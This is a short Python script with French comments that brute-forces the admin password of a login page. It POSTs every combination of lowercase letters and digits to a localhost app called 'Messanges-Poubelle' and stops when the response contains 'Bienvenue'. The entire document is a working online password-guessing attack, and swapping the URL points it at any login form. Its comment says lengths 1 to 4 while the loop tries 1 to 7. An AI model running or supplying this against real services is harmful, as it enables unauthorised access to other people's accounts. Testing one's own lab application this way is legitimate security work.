import requests
import itertools
import string

url = "http://localhost/Messanges-Poubelle/login.php"
username = "admin"

# Choix des caractères à tester
caracteres = string.ascii_lowercase + string.digits  # abcdef...0123456789

# On teste les mots de passe de longueur 1 à 4
for longueur in range(1, 8):
    for combinaison in itertools.product(caracteres, repeat=longueur):
        password = ''.join(combinaison)

        data = {
            "username": username,
            "password": password
        }

        try:
            response = requests.post(url, data=data)
            if "Bienvenue" in response.text:
                print(f"[+] Mot de passe trouvé : {password}")
                exit()
            else:
                print(f"[-] Échec : {password}")
        except Exception as e:
            print(f"[!] Erreur : {e}")
